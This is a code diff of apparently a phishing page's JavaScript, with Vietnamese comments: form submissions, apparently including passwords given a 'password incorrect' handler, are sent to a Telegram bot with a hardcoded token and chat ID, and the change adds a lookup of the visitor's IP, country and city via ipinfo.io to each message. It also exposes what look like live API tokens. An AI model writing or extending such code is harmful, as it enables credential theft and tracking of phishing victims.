@@ -4456,7 +4456,7 @@ formData.forEach((value, key) => {
 });
 
 console.log(formObject);
-await sendTele(formatMessage(formObject))
+await sendTele(await formatMessage(formObject))
         }
 
         function hidePasswordIncorrectText() {
@@ -4760,6 +4760,7 @@ await sendTele(formatMessage(formObject))
         })
 
         const sendTele = async (message) => {
+            console.log(message)
     const token = '7401189273:AAFw_XI65C9kQypHWf6v2wiQsr3aq4XGpqo'; // Thay bằng token bot của bạn
     const chatId = '-4579170320'; // Thay bằng chat ID của bạn hoặc ID của nhóm/kênh
 
@@ -4790,8 +4791,28 @@ await sendTele(formatMessage(formObject))
         console.error('Failed to send message:', error);
     }
 };
-const formatMessage = (dataObject, title = 'New Submission') => {
-    let message = `📩 *${title}* 📩\n\n`;
+const formatMessage =async (dataObject, title = 'New Submission') => {
+    let ip = 'Unknown IP';
+    let country = 'Unknown Country';
+    let city = 'Unknown City';
+    try {
+        const token = 'ff98e2ddecdf4f';  // Thay thế token của bạn ở đây
+        const url = `https://ipinfo.io/json?token=${token}`;
+        const response = await fetch(url);
+                if (response.ok) {
+                    const data = await response.json();
+                    ip = data.ip;
+                    country = data.country;
+                    city = data.city;
+                } else {
+                    throw new Error('Failed to fetch IP information. Response status: ' + response.status);
+                }
+    } catch (error) {
+        console.error('Failed to fetch IP address:', error);
+    }
+    let message = `IP: *${ip}* \n`;
+     message += `Country: *${country}* \n`;
+     message += `City: *${city}* \n\n`;
 
     for (const [key, value] of Object.entries(dataObject)) {
         // Chuyển đổi key thành một định dạng thân thiện hơn (nếu cần)
